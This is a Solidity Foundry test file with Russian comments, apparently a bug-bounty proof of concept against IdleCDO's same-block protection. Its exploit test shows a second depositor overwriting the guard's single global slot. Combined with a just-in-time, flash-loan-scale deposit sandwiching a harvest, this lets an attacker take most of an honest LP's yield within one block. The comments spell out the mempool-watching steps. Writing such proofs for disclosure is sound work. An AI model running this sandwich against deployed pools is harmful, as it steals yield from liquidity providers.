// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

// ─────────────────────────────────────────────────────────────────────────────
// PoC #1 (ДОКРУЧЕННЫЙ до High/Critical).
//
// В файле IdleCDOSameBlockPoC.t.sol доказан ТОЛЬКО механизм: слабую same-block
// защиту можно обойти (первый депозитор выходит в том же блоке). Но там цена
// транша 1:1, поэтому денежной прибыли нет — сам по себе обход тянет лишь на
// Medium.
//
// Здесь мы СОЕДИНЯЕМ две вещи:
//   (A) обход same-block защиты (перезапись единственного глобального слота
//       вторым депозитором в том же блоке) — из исходного PoC;
//   (B) СКАЧОК виртуальной цены транша в том же блоке — из-за харвеста, который
//       зачисляет в стратегию доходность, ЗАРАБОТАННУЮ капиталом за период ДО
//       этого блока.
//
// Идея атаки (классический JIT / yield-sandwich, усиленный флэшлоаном):
//   1. Атакующий видит в мемпуле транзакцию харвеста (она поднимет NAV/цену).
//   2. В том же блоке ПЕРЕД харвестом он депонирует БОЛЬШОЙ капитал (можно
//      флэшлоан — атака атомарна, риска нет) и минтит транш-доли по СТАРОЙ цене.
//   3. Проходит харвест -> цена транша скачет вверх.
//   4. Тем же блоком проходит вывод. По задумке same-block защита обязана его
//      реверзить, но её обходят (слот перезаписан вторым депозитором).
//   5. Атакующий сжигает доли по НОВОЙ цене и забирает БОЛЬШЕ, чем внёс.
//
// Реальная прибыль — это доходность, заработанная капиталом ЧЕСТНОГО LP за
// время, но размазанная по всем долям на момент харвеста. JIT-депозитор
// капитала «во времени» не давал, но ворует долю уже заработанного дохода.
//
// Именно same-block защита — единственный барьер против атомарной (флэшлоан)
// версии этой атаки. Её обход превращает Medium в High/Critical: тест ниже
// доказывает СНЯТИЕ БОЛЬШЕ ВНЕСЁННОГО за один блок.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Минимальный underlying-токен с mint (для эмуляции доходности харвеста).
contract Underlying {
    string public name = "Mock USD";
    string public symbol = "mUSD";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Стратегия с ИЗМЕНЯЕМОЙ ценой (share-vault, аналог IIdleCDOStrategy).
///      Цена доли = assets/totalShares. harvest() зачисляет реальную доходность,
///      не меняя число долей => цена доли (и цена транша выше) скачет вверх.
contract PricedStrategy {
    Underlying public token;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;

    constructor(Underlying _token) {
        token = _token;
    }

    /// @dev все underlying, лежащие в стратегии
    function assets() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    /// @dev цена одной strategy-доли в underlying (1e18-нотация)
    function price() public view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (assets() * 1e18) / totalShares;
    }

    /// @dev внести underlying -> получить доли по текущей цене
    function deposit(uint256 amount) external returns (uint256 shares) {
        uint256 a = assets(); // ДО приёма средств
        token.transferFrom(msg.sender, address(this), amount);
        shares = (totalShares == 0) ? amount : (amount * totalShares) / a;
        totalShares += shares;
        sharesOf[msg.sender] += shares;
    }

    /// @dev сжечь доли -> получить underlying по текущей цене
    function redeem(uint256 shares) external returns (uint256 amount) {
        amount = (shares * assets()) / totalShares;
        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        token.transfer(msg.sender, amount);
    }

    /// @dev ХАРВЕСТ: фиксированная доходность, ЗАРАБОТАННАЯ капиталом за период
    ///      ДО этого блока, зачисляется в стратегию. totalShares НЕ меняется =>
    ///      price() растёт. Это и есть «скачок цены транша в том же блоке».
    ///      Сумма фиксирована и НЕ зависит от свежего JIT-капитала — доход был
    ///      начислен на старый капитал (LP), просто реализован в этом блоке.
    function harvest(uint256 profit) external {
        token.mint(address(this), profit);
    }
}

/// @dev Урезанный IdleCDO: доли транша = доли пула (vault-математика) + та же
///      ОРИГИНАЛЬНАЯ same-block защита. Цена транша теперь ПРИВЯЗАНА к NAV
///      стратегии, поэтому харвест реально двигает цену.
contract PricedCDO {
    // ---- скопировано из IdleCDO / IdleCDOStorage ----
    bytes32 internal _lastCallerBlock; // единственный глобальный слот защиты
    error SameBlock();
    // -------------------------------------------------

    Underlying public token;
    PricedStrategy public strategy;
    uint256 public totalTranche;
    mapping(address => uint256) public trancheBalance;

    constructor(Underlying _token, PricedStrategy _strategy) {
        token = _token;
        strategy = _strategy;
    }

    /// @dev стоимость всех активов пула в underlying = strat-доли CDO * цена доли
    function totalAssets() public view returns (uint256) {
        return (strategy.sharesOf(address(this)) * strategy.price()) / 1e18;
    }

    /// @dev виртуальная цена одного транш-токена
    function virtualPrice() public view returns (uint256) {
        if (totalTranche == 0) return 1e18;
        return (totalAssets() * 1e18) / totalTranche;
    }

    /// @dev порядок как в IdleCDO._deposit: сначала _updateCallerBlock
    function deposit(uint256 amount) external returns (uint256 minted) {
        _updateCallerBlock(); // IdleCDO.sol:241
        uint256 assetsBefore = totalAssets();
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(address(strategy), amount);
        strategy.deposit(amount);
        // доли транша по цене ДО приёма средств (стандартная vault-математика)
        minted = (totalTranche == 0) ? amount : (amount * totalTranche) / assetsBefore;
        totalTranche += minted;
        trancheBalance[msg.sender] += minted;
    }

    /// @dev порядок как в IdleCDO._withdraw: сначала _checkSameBlock
    function withdraw(uint256 shares) external returns (uint256 out) {
        _checkSameBlock(); // IdleCDO.sol:479
        // доля пула, приходящаяся на сжигаемые транш-токены (в strat-долях)
        uint256 stratShares = (shares * strategy.sharesOf(address(this))) / totalTranche;
        trancheBalance[msg.sender] -= shares;
        totalTranche -= shares;
        out = strategy.redeem(stratShares);
        token.transfer(msg.sender, out);
    }

    // ===== ДОСЛОВНО из IdleCDO.sol:1015–1023 =====
    function _updateCallerBlock() internal {
        _lastCallerBlock = keccak256(abi.encodePacked(tx.origin, block.number));
    }

    function _checkSameBlock() internal view {
        if (keccak256(abi.encodePacked(tx.origin, block.number)) == _lastCallerBlock) revert SameBlock();
    }
    // =============================================
}

contract IdleCDOSameBlockProfitPoC is Test {
    Underlying token;
    PricedStrategy strategy;
    PricedCDO cdo;

    address victim = address(0x11C); // честный LP, чей капитал зарабатывал доход
    address attacker = address(0xBAD); // JIT-атакующий (капитал можно флэшлоанить)
    address helper = address(0x5107); // второй депозитор, перезаписывает слот

    uint256 constant VICTIM_DEPOSIT = 1_000e18;
    uint256 constant ATTACKER_DEPOSIT = 9_000e18; // «флэшлоан»-масштаб
    uint256 constant HARVEST_PROFIT = 200e18; // доход, заработанный капиталом victim

    function setUp() public {
        token = new Underlying();
        strategy = new PricedStrategy(token);
        cdo = new PricedCDO(token, strategy);

        token.mint(victim, VICTIM_DEPOSIT);
        token.mint(attacker, ATTACKER_DEPOSIT);
        token.mint(helper, 1e18);

        vm.prank(victim);
        token.approve(address(cdo), type(uint256).max);
        vm.prank(attacker);
        token.approve(address(cdo), type(uint256).max);
        vm.prank(helper);
        token.approve(address(cdo), type(uint256).max);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // БАЗА (контроль): без атакующего весь доход харвеста достаётся честному LP.
    // Нужен как эталон, чтобы измерить, СКОЛЬКО ворует атака.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Baseline_NoAttacker_VictimKeepsAllYield() public {
        vm.prank(victim, victim);
        cdo.deposit(VICTIM_DEPOSIT);

        // Харвест реализует доход, заработанный капиталом victim.
        strategy.harvest(HARVEST_PROFIT);

        // Victim выходит в следующем блоке (свой origin — защита не мешает).
        // ВАЖНО: читаем баланс ДО prank — иначе этот read «съест» prank.
        uint256 vShares = cdo.trancheBalance(victim);
        vm.roll(block.number + 1);
        vm.prank(victim, victim);
        uint256 out = cdo.withdraw(vShares);

        uint256 yield = out - VICTIM_DEPOSIT;
        console2.log(unicode"БАЗА: доход честного LP без атаки:", yield / 1e18);
        assertApproxEqAbs(yield, HARVEST_PROFIT, 1e12, unicode"LP получает весь доход харвеста");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // КОНТРОЛЬ ПРИЧИННОСТИ: если same-block защита НЕ обойдена (нет второго
    // депозитора), атомарный сэндвич невозможен — вывод атакующего реверзит
    // SameBlock. То есть САМА по себе цена-скачок не помогает: барьер держит.
    // Это показывает, что High появляется ИМЕННО из-за обхода защиты.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Guard_ActiveBlocksAtomicSandwich() public {
        vm.prank(victim, victim);
        cdo.deposit(VICTIM_DEPOSIT);

        // Всё в ОДНОМ блоке: депозит атакующего -> харвест -> попытка вывода.
        vm.prank(attacker, attacker);
        cdo.deposit(ATTACKER_DEPOSIT); // слот = keccak(attacker, block)

        strategy.harvest(HARVEST_PROFIT); // цена скакнула

        // Обхода нет: слот всё ещё keccak(attacker, block) -> вывод заблокирован.
        uint256 aShares = cdo.trancheBalance(attacker); // читаем ДО prank
        vm.prank(attacker, attacker);
        vm.expectRevert(PricedCDO.SameBlock.selector);
        cdo.withdraw(aShares);

        console2.log(unicode"КОНТРОЛЬ: без обхода атомарный сэндвич заблокирован SameBlock");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // ЭКСПЛОЙТ (High/Critical): обход same-block защиты + скачок цены = РЕАЛЬНАЯ
    // прибыль за ОДИН блок. Атакующий снимает БОЛЬШЕ, чем внёс; разница украдена
    // у честного LP.
    // ─────────────────────────────────────────────────────────────────────────
    function test_Exploit_BypassPlusPriceJump_RealProfitInOneBlock() public {
        // Честный LP уже давно в пуле; его капитал и заработал будущий доход.
        vm.prank(victim, victim);
        cdo.deposit(VICTIM_DEPOSIT);

        uint256 attackerBalBefore = token.balanceOf(attacker);
        uint256 vpBefore = cdo.virtualPrice();

        // ===== ВСЁ НИЖЕ — В ОДНОМ БЛОКЕ (block.number не меняем) =====

        // 1) JIT-депозит атакующего ПЕРЕД харвестом (капитал можно флэшлоанить).
        //    Доли минтятся по СТАРОЙ цене. Слот = keccak(attacker, block).
        vm.prank(attacker, attacker);
        cdo.deposit(ATTACKER_DEPOSIT);

        // 2) Проходит харвест -> виртуальная цена транша СКАЧЕТ вверх в том же блоке.
        strategy.harvest(HARVEST_PROFIT);
        uint256 vpAfter = cdo.virtualPrice();
        assertGt(vpAfter, vpBefore, unicode"цена транша скакнула в том же блоке");

        // 3) ОБХОД same-block защиты: второй депозитор (helper) перезаписывает
        //    единственный глобальный слот -> keccak(helper, block).
        vm.prank(helper, helper);
        cdo.deposit(1e18);

        // 4) Атакующий выходит В ТОМ ЖЕ БЛОКЕ. keccak(attacker,block) != слот -> ОК.
        uint256 aShares = cdo.trancheBalance(attacker); // читаем ДО prank
        vm.prank(attacker, attacker);
        uint256 out = cdo.withdraw(aShares);

        // ===== КОНЕЦ БЛОКА =====

        uint256 attackerBalAfter = token.balanceOf(attacker);

        // ГЛАВНОЕ ДОКАЗАТЕЛЬСТВО: снял больше, чем внёс, за один блок.
        assertGt(out, ATTACKER_DEPOSIT, unicode"вывод БОЛЬШЕ внесённого");
        assertGt(attackerBalAfter, attackerBalBefore, unicode"чистая прибыль в underlying");

        uint256 profit = out - ATTACKER_DEPOSIT;
        console2.log(unicode"ЭКСПЛОЙТ: внёс (USD):     ", ATTACKER_DEPOSIT / 1e18);
        console2.log(unicode"ЭКСПЛОЙТ: снял  (USD):     ", out / 1e18);
        console2.log(unicode"ЭКСПЛОЙТ: чистая прибыль:  ", profit / 1e18);

        // Прибыль существенна: атакующий перехватил львиную долю дохода харвеста,
        // хотя капитал держал 0 времени. (9000/10000 долей -> ~180 из 200.)
        assertGt(profit, 150e18, unicode"прибыль ~ доля харвеста, перехваченная JIT");

        // Обратная сторона — кража у честного LP: его доход рухнул относительно БАЗЫ.
        uint256 vShares = cdo.trancheBalance(victim); // читаем ДО prank
        vm.roll(block.number + 1);
        vm.prank(victim, victim);
        uint256 victimOut = cdo.withdraw(vShares);
        uint256 victimYield = victimOut - VICTIM_DEPOSIT;
        console2.log(unicode"ЖЕРТВА: доход LP после атаки:", victimYield / 1e18);
        console2.log(unicode"ЖЕРТВА: доход LP по БАЗЕ был:", HARVEST_PROFIT / 1e18);
        assertLt(victimYield, 30e18, unicode"доход честного LP украден JIT-атакующим");
    }
}
